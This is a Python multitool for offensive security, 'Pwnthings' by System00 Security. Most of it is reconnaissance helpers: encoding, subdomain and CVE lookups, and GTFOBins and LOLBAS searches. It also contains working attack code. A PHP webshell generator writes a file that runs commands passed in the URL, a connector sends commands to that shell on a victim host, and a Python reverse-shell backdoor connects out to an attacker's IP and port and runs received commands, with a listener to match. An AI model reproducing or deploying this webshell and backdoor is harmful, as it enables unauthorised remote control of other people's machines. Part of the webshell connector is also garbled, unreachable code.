#!/usr/bin/env python3
# Dependency[1]
__author__="Joy Ghosh [SYSTEM00 SECURITY]"
__licence__='''
Copyright (C) 2020 System00 Security , this program is free software : you can redistribute it and modify
it by giving credit to main author licenced under the terms of GNU General Public License as published by the free
software foundation.
'''
import sys
import os
execute=os.system
if sys.version_info[0]==3:
    try:
        # Dependency[2]
        from googlesearch import search
        import random
        from netaddr import IPNetwork
        import base64
        import requests
        import html2text
        import cloudscraper
        import argparse
        import re
        import socket
        import wget
        from tcping import Ping
        from bs4 import BeautifulSoup
        import codecs
        import mmh3
        import json
        import dns.resolver
        from urlextract import URLExtract
        import time
        from colorama import Fore, Style
    except ImportError:
        print('')
        print(" Some Of Required Python library is missing , installing those] ")
        os=os.name
        print('[+]Detecting OS ')
        if os=="posix":
            print(f'{Fore.GREEN}[ LINUX ]{Fore.WHITE}')
            execute('pip3 install --upgrade pip')
            execute('pip3 install requests')
            execute('pip3 install random2')
            execute('pip3 install netaddr')
            execute('pip3 install html2text')
            execute('pip3 install cloudscraper')
            execute('pip3 install argparse')
            execute('pip3 install google')
            execute('pip3 install bs4')
            execute('pip3 install wget')
            execute('pip3 install tcping')
            execute('pip3 install dnspython')
            execute('pip3 install urlextract')
            execute('pip3 install colorama')
            execute('pip3 install mmh3')
        elif os=="nt":
            print(f'{Fore.GREEN}[ WINDOWS ]{Fore.WHITE}')
            execute('python3 -m pip install --upgrade pip')
            execute('python3 -m pip install requests')
            execute('python3 -m pip install random2')
            execute('python3 -m pip install netaddr')
            execute('python3 -m pip install html2text')
            execute('python3 -m pip install cloudscraper')
            execute('python3 -m pip install argparse')
            execute('python3 -m pip install google')
            execute('python3 -m pip install wget')
            execute('python3 -m pip install bs4')
            execute('python3 -m pip install tcping')
            execute('python3 -m pip install dnspython')
            execute('python3 -m pip install urlextract')
            execute('python3 -m pip install colorama')
            execute('python3 -m pip install mmh3')
        else:
            print(f'{Fore.RED}This Tool is Supported only on Linux/Windows{Fore.WHITE}')


    #Dependency(http header)[3]
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36'}
    print('  ')
    #tool_logo
    def logo():
        print(f"""
-------------------
  ___             _   _    _
 | _ \__ __ ___ _| |_| |_ (_)_ _  __ _ ___
 |  _/\ V  V / ' \  _| ' \| | ' \/ _` (_-<
 |_|   \_/\_/|_||_\__|_||_|_|_||_\__, /__/
                                 |___/    system00://{Fore.RED}script{Fore.WHITE}
------------------- """)

    #Company_Cert
    def cert():
        cert=f"""{Fore.BLUE}

█▀ █▄█ █▀ ▀█▀ █▀▀ █▀▄▀█ █▀█ █▀█ ▄▄ █▀ █▀▀ █▀▀ █░█ █▀█ █ ▀█▀ █▄█
▄█ ░█░ ▄█ ░█░ ██▄ █░▀░█ █▄█ █▄█ ░░ ▄█ ██▄ █▄▄ █▄█ █▀▄ █ ░█░ ░█░{Fore.RED}

                        U N D E R G R O U N D{Fore.WHITE}

{Fore.RED}[X]{Fore.WHITE} Project is {Fore.GREEN}   Verified (✔){Fore.WHITE}
{Fore.RED}[X]{Fore.WHITE} Unpublished For Beta Testers Only

        """
        print(cert)
    #modules
    #Base64_encode_decode
    def base64_encode(value):
        print(base64.b64encode(bytearray(value,'ascii')).decode('utf-8'))
    def base64_decode(value):
        print(base64.b64decode(bytearray(value,'ascii')).decode('utf-8'))
    #Base32_encode_decode
    def base32_encode(value):
        print(base64.b32encode(bytearray(value,'ascii')).decode('utf-8'))
    def base32_decode(value):
        print(base64.b32decode(bytearray(value,'ascii')).decode('utf-8'))
    #google_search
    def google_search(query):
        for result in search(query, num=30, start=0, stop=None, pause=2.0):
            print(result)
    #rot13encode
    def rot13_encoder(string):
        rot13_encoder=codecs.getencoder("rot-13")
        encrypt=rot13_encoder(string)[0]
        print(encrypt)
    #rot13_decode
    def rot13_decoder(string):
        rot13_encoder=codecs.getdecoder("rot-13")
        encrypt=rot13_encoder(string)[0]
        print(encrypt)
    #gtfobin_search
    def gtfobin_search(query):
        get_data=requests.get(f'https://gtfobins.github.io/gtfobins/{query}')
        if get_data.status_code==200:
            print(f'{Fore.GREEN}[+]{Fore.WHITE} Bypass Found For {query}')
            print('  ')
            print(html2text.html2text(get_data.text))
        else:
            print(f'{Fore.RED}[X]{Fore.WHITE} No Bypass Found For this Binary')
            print('  ')
    #wget
    def wgetd(url):
        print(f'{Fore.RED}[+]{Fore.WHITE} Downloading File')
        d=wget.download(url)
        print(f'\n{Fore.GREEN}[*]{Fore.WHITE} File Saved as '+d)
    #lolbash_search
    def lolbash_search(query):
        query=query.capitalize()
        get_data=requests.get(f'https://lolbas-project.github.io/lolbas/Binaries/{query}')
        if get_data.status_code==200:
            print(f'{Fore.GREEN}[+]{Fore.WHITE} Bypass Found For {query}')
            print('  ')
            print(html2text.html2text(get_data.text))
        else:
            print(f'{Fore.RED}[X]{Fore.WHITE} No Bypass Found For this Binary')
            print('  ')
    #exploits.shodan.io
    def exploit_shodan(query):
        url1=f"https://exploits.shodan.io/?q={query}&p=1"
        def result(url):
            r = requests.get(url, headers=headers)
            soup = BeautifulSoup(r.content, 'lxml')
            search = soup.find_all('div',class_="result")
            for h in search:
                link=h.a.get('href')
                title=h.a.get_text()
                print(Fore.RED,link,' ',Fore.GREEN,title,Fore.WHITE)
        result(url1)
    #leakix_search
    def leakix_search(ip):
        get = requests.get(f'https://leakix.net/host/{ip}')
        comp = BeautifulSoup(get.content, 'lxml')
        search = comp.find_all('pre',class_="rounded p-1 wrap")
        for data in search:
            print(f'{Fore.RED}[+]{Fore.WHITE}  {ip} {Fore.RED}[LEAK]{Fore.WHITE}')
            print()
            print(Fore.CYAN+data.get_text()+Fore.WHITE)
    #spyse_cve_finder
    def spyse_cve(url):
        cve_finder=f'https://spyse.com/target/domain/{url}/cve'
        scraper = cloudscraper.create_scraper(browser={'browser': 'chrome','platform': 'linux','mobile': False})
        get_data=scraper.get(cve_finder).text
        data_bf = BeautifulSoup(get_data, 'lxml')
        get_cve = data_bf.find_all('div',class_="cve-id__text")
        for cve in get_cve:
            data_list=re.findall("CVE-\d{4}-\d{4,7}",cve.get_text())
            for cvedata in data_list:
                print(f'{Fore.RED}[+]{Fore.GREEN} CVE for {url} Found {Fore.RED} ::- {cvedata} {Fore.WHITE}')
    #favico_hash
    def favico_hash(url):
        get_data=requests.get(url+'/favicon.ico')
        favicon=codecs.encode(get_data.content,"base64")
        hash = mmh3.hash(favicon)
        print(hash)
    #pinging
    def pinging(host):
        ping=Ping(host)
        ping.ping(3)
    #ip2geodata
    def ip2location(ip):
        get=requests.get(f'http://ip-api.com/json/{ip}')
        load=json.loads(get.text)
        print(json.dumps(load, indent=4, sort_keys=True))
    #cat
    def cat_bin(file):
        with open(file) as f:
            contents = f.read()
            print(contents)
    #passive_subdomain
    def passive_subdomain(domain):
        bufferoverrun=requests.get(f'https://dns.bufferover.run/dns?q={domain}').json()
        buff_dump=json.dumps(bufferoverrun)
        buff_load=json.loads(buff_dump)
        for subs in buff_load['FDNS_A']:
            ip,urls=subs.split(',')
            print(urls)
        for subs in buff_load['RDNS']:
            ip,urls=subs.split(',')
            print(urls)
        hackertarget=requests.get(f'https://api.hackertarget.com/hostsearch/?q={domain}').text
        hostnames = [result.split(",")[0]for result in hackertarget.split("\n")]
        for hostname in hostnames:
            print(hostname)
        threatcrowd=requests.get(f'https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}').json()
        threatcrowd_dumps=json.dumps(threatcrowd)
        threatcrowd_loads=json.loads(threatcrowd_dumps)
        for subs in threatcrowd_loads['subdomains']:
            print(subs)
    #cmd_webshell_gen
    def cmd_webshell_gen():
        backdoor=open("got.php",'w')
        backdoor.write("<?php system($_GET['cmd']);?>")
        backdoor.close()
    #cmd_webshell_connect
    def c_shell(url):
        prot,name=url.split('//')
        command=input(f'{Fore.BLUE}[{name}]{Fore.GREEN} @{Fore.RED} [GOT-SHELL]:$~ {Fore.WHITE}')
        if command=="exit":
            exit()
        else:
            resp=requests.get(url+'/got.php?cmd='+command)
            print(resp.text)
            c_shell(url)
            def uest(url):
                response=requests.get(url+"/got.php")
                if response.status_code==200:
                    print('')
                    print(f'{Fore.GREEN}[-Connected{Fore.RED}****{Fore.GREEN}-] {Fore.WHITE}')
                    print('')
                    c_shell(url)
                else:
                    pass
                    time.sleep(6.0)
                    uest(url)
                    uest(target)
    #host_to_ip
    def host_to_ip(host):
        host2ip=socket.gethostbyname(host)
        print(host+' - '+host2ip)
    #asn_lookup
    def asn_lookup(company):
        headers = {
        'User-Agent': 'ASNLookup PY/Client'
        }
        asn_db=requests.get(f'http://asnlookup.com/api/lookup?org={company}',headers).text
        print(f'{Fore.GREEN}[+] {Fore.WHITE}ASN Lookup Result For {company}')
        print('')
        asndb_load=json.loads(asn_db)
        for iprange in asndb_load:
            print(iprange)
    #git cve finder
    def git_cve(cve):
        cvei,year,num=cve.split('-')
        try:
            cve_url=requests.get(f'https://raw.githubusercontent.com/System00-Security/PoC-in-GitHub/master/{year}/{cve}.json')
            cve_text=cve_url.json()
            cve_conv=cve_text[0]
            cve_dump=json.dumps(cve_conv)
            cve_load=json.loads(cve_dump)
            print(Fore.GREEN+'[+] Description : '+Fore.BLUE+cve_load['description']+Fore.WHITE)
            print(Fore.GREEN+'[+] Git Url : '+Fore.BLUE+cve_load['html_url']+Fore.WHITE)
        except TypeError:
            print(Fore.RED+"CVE Not found / Other Problem"+Fore.WHITE)
        except:
            exit()
    #filters
    def filter_ip():
        for line in sys.stdin:
            ips = re.findall( r'[0-9]+(?:\.[0-9]+){3}',line)
            for ip in ips:
                print(ip)
    def filter_url():
        filter = URLExtract()
        for line in sys.stdin:
            urls=filter.find_urls(line)
            for url in urls:
                print(url)
    def filter_email():
        for line in sys.stdin:
            emails = re.findall(r'[\w\.-]+@[\w\.-]+',line)
            for email in emails:
                print(email)
    #pybackdoor
    def pybackdoor_listner(ip,port):
        HOST=ip
        PORT=port
        server = socket.socket()
        server.bind((HOST, PORT))
        print(f'{Fore.GREEN}[+]{Fore.WHITE} Started')
        print(f'{Fore.GREEN}[+]{Fore.WHITE} Listening For Client Connection ...')
        server.listen(1)
        client, client_addr = server.accept()
        print(f'{Fore.GREEN}[+]{Fore.WHITE} {client_addr} Client connected to the server')
        while True:
            command = input(f'{HOST}@Unkown00~ ')
            command = command.encode()
            client.send(command)
            output = client.recv(1024)
            output = output.decode()
            print(output)
    def pybackdoor_gen(ip,port):
        backdoor=f"""
import socket
import subprocess
from colorama import Fore, Back, Style
def con_client(rhost,rport):
    get= socket.socket()
    print(f'{Fore.RED}[#]{Fore.WHITE} Initiating Backdoor')
    get.connect((rhost, rport))
    print(f'{Fore.GREEN}[|*|]{Fore.WHITE} Connected')
    while True:
        exec = get.recv(1024)
        exec = exec.decode()
        resp = subprocess.Popen(exec, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        response = resp.stdout.read()
        null_resp = resp.stderr.read()
        get.send(response + null_resp)

con_client('{ip}',{port})
        """
        back=open('backdoor.py','w')
        back.write(backdoor)
        back.close()
    #tempmail
    def temp_mail(username):
        print(f'{Fore.GREEN}[+]{Fore.WHITE} Your Mail Adress {username}@1secmail.com')
        send=requests.get(f'https://www.1secmail.com/api/v1/?action=getMessages&login={username}&domain=1secmail.com')
        send_data=send.json()
        send_dump=json.dumps(send_data)
        send_loads=json.loads(send_dump)
        for mails in send_loads:
            print(f'{Fore.RED}----------------------{Fore.WHITE}')
            id=mails['id']
            read_mail=requests.get(f'https://www.1secmail.com/api/v1/?action=readMessage&login={username}&domain=1secmail.com&id={id}')
            read_dump=json.dumps(read_mail.json())
            read_loads=json.loads(read_dump)
            print(f'''
    {Fore.GREEN}[  MSG ID   ] : {Fore.WHITE} { read_loads['id'] }
    {Fore.GREEN}[   From    ] : {Fore.WHITE} { read_loads['from'] }
    {Fore.GREEN}[  Subject  ] : {Fore.WHITE} { read_loads['subject'] }
    {Fore.GREEN}[   Date    ] : {Fore.WHITE} { read_loads['date'] }
    {Fore.GREEN}[   Body    ] : {Fore.WHITE} { read_loads['body'] }
    {Fore.GREEN}[ Text body ] : {Fore.WHITE} { read_loads['textBody'] }
            ''')
            print(f'{Fore.RED}----------------------{Fore.WHITE}')
    #name_server
    def name_server(domain):
        answers = dns.resolver.resolve(domain,'NS')
        for server in answers:
            print(server.target)
    def iprange(iprange):
        for ip in IPNetwork(iprange):
            print(ip)

    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("-cert", "--cert", help="Show Verification Cert  example: tool.py -cert show", type=str)
        parser.add_argument("-base64e", "--base64_encode", help="encode a string to base64 example: tool.py -base64e hi", type=str)
        parser.add_argument("-base64d", "--base64_decode", help="decode a base64 string: tool.py -base64e aGk= ", type=str)
        parser.add_argument("-base32e", "--base32_encode", help="encode a string to base32 example: tool.py -base64e hi", type=str)
        parser.add_argument("-base32d", "--base32_decode", help="decode a base32 string example: tool.py -base64e NBUQ==== ", type=str)
        parser.add_argument("-rot13e", "--rot13_encode", help="encode a string to rot13 example: tool.py -rot13e hi ", type=str)
        parser.add_argument("-rot13d", "--rot13_decode", help="decode a rot13 string example: tool.py -rot13e uv ", type=str)
        parser.add_argument("-gsearch", "--googlesearch", help="Search Your Query in google example: tool.py -gsearch 'yoursearch' ", type=str)
        parser.add_argument("-gtfobin", "--gtfobinsearch", help="Search Bypass for binary in gtfobin example: tool.py -gtfobin 'vim' ", type=str)
        parser.add_argument("-lolbas", "--lolbasearch", help="Search Bypass for binary in lolbas example: tool.py -lolbas 'bash' ", type=str)
        parser.add_argument("-expshodan", "--exploit_shodan", help="Search possible exploit for target software in exploits.shodan.io example: tool.py -expshodan 'apache 2.0' ", type=str)
        parser.add_argument("-leakix", "--leakix_search", help="Search leak of a ip address in leakix example: tool.py -leakix 192.168.1.1 ", type=str)
        parser.add_argument("-spyse", "--spyse_cve", help="Search Possible Cve for target in spyse example: tool.py -spyse example.com ", type=str)
        parser.add_argument("-favicohash", "--favico_hash", help="convert a websites favicon to searchable hash example: tool.py -favicohash https://uber.com ", type=str)
        parser.add_argument("-ping", "--ping", help="ping a ip or host example: tool.py -ping google.com ", type=str)
        parser.add_argument("-ip2location", "--ip2location", help="GeoLocate a ip address example: tool.py -ip2location 103.123.11.1 ", type=str)
        parser.add_argument("-cat", "--cat", help="show content of a file example: tool.py -cat data.txt ", type=str)
        parser.add_argument("-subdomain", "--subdomain", help="Passively Gather Subdomains of a domain example: tool.py -subdomain uber.com ", type=str)
        parser.add_argument("-gencmd", "--gencmd", help="Generate simple cmd php webshell example: tool.py -gencmd gen", type=str)
        parser.add_argument("-connectcmd", "--connectcmd", help="connect to simple cmd shell example: tool.py -connectcmd http://victim.com ", type=str)
        parser.add_argument("-host2ip", "--host_to_ip", help="convert hostname to ip address example: tool.py -host2ip victim.com ", type=str)
        parser.add_argument("-asnlookup", "--asnlookup", help="lookup asn by company name example: tool.py -asnlookup tesla ", type=str)
        parser.add_argument("-gitcve", "--gitcve", help="search exploit for cve in github example: tool.py -gitcve CVE-2020-1211 ", type=str)
        parser.add_argument("-filterip", "--filterip", help="Filter ip from stdin  example: tool.py -filterip pipe ", type=str)
        parser.add_argument("-filterurl", "--filterurl", help="Filter url from stdin  example: tool.py -filterurl pipe ", type=str)
        parser.add_argument("-filteremail", "--filteremail", help="Filter email from stdin  example: tool.py -filteremail pipe ", type=str)
        parser.add_argument("-backdoor_listner", "--backdoor_listner", help="start listener for python backdoor  example: tool.py -backdoor_listner 192.168.1.1:1337 ", type=str)
        parser.add_argument("-backdoor_gen", "--backdoor_gen", help="generate python backdoor client  example: tool.py -backdoor_gen 192.168.1.1:1337 ", type=str)
        parser.add_argument("-tempmail", "--tempmail", help="generate temporary mail for testing  example: tool.py -tempmail myusername ", type=str)
        parser.add_argument("-iprange", "--iprange", help="generate ipaddress for iprange  example: tool.py -iprange 192.168.1.1/23 ", type=str)
        parser.add_argument("-wget", "--wget", help="to download file from web  example: tool.py -wget https://wget.example.com/file.zip ", type=str)
        args = parser.parse_args()
        if args.cert is not None:
            cert()
        elif args.base64_encode is not None:
            logo()
            base64_encode(args.base64_encode)
        elif args.base64_decode is not None:
            logo()
            base64_decode(args.base64_decode)
        elif args.base32_encode is not None:
            logo()
            base32_encode(args.base32_encode)
        elif args.base32_decode is not None:
            logo()
            base32_decode(args.base32_decode)
        elif args.googlesearch is not None:
            logo()
            google_search(args.googlesearch)
        elif args.gtfobinsearch is not None:
            logo()
            gtfobin_search(args.gtfobinsearch)
        elif args.lolbasearch is not None:
            logo()
            lolbash_search(args.lolbasearch)
        elif args.exploit_shodan is not None:
            logo()
            exploit_shodan(args.exploit_shodan)
        elif args.leakix_search is not None:
            logo()
            leakix_search(args.leakix_search)
        elif args.spyse_cve is not None:
            logo()
            spyse_cve(args.spyse_cve)
        elif args.favico_hash is not None:
            logo()
            favico_hash(args.favico_hash)
        elif args.ping is not None:
            logo()
            pinging(args.ping)
        elif args.ip2location is not None:
            logo()
            ip2location(args.ip2location)
        elif args.cat is not None:
            cat_bin(args.cat)
        elif args.subdomain is not None:
            passive_subdomain(args.subdomain)
        elif args.gencmd is not None:
            logo()
            cmd_webshell_gen()
            print(f'{Fore.GREEN}[+]{Fore.WHITE} Generated')
        elif args.connectcmd is not None:
            logo()
            c_shell(args.connectcmd)
        elif args.host_to_ip is not None:
            logo()
            host_to_ip(args.host_to_ip)
        elif args.asnlookup is not None:
            logo()
            asn_lookup(args.asnlookup)
        elif args.gitcve is not None:
            logo()
            git_cve(args.gitcve)
        elif args.filterip is not None:
            filter_ip()
        elif args.filterurl is not None:
            filter_url()
        elif args.filteremail is not None:
            filter_email()
        elif args.backdoor_listner is not None:
            logo()
            ipp,pport=args.backdoor_listner.split(":")
            pport=int(pport)
            pybackdoor_listner(ipp,pport)
        elif args.backdoor_gen is not None:
            logo()
            ipp,pport=args.backdoor_gen.split(":")
            pport=int(pport)
            pybackdoor_gen(ipp,pport)
            print(f'{Fore.GREEN}[+]{Fore.WHITE} backdoor generated')
        elif args.tempmail is not None:
            logo()
            temp_mail(args.tempmail)
        elif args.iprange is not None:
            iprange(args.iprange)
        elif args.wget is not None:
            wgetd(args.wget)
        elif args.rot13_encode is not None:
            logo()
            rot13_encoder(args.rot13_encode)
        elif args.rot13_decode is not None:
            logo()
            rot13_decoder(args.rot13_decode)




        else:
            logo()
            print('type -h to see all the options')
    except TypeError:
      logo()
      print("Type -h To See all the options")
    except NameError:
        print('Something is missing')



else:
    print('')
    print('[X] Please Use Python 3.x')
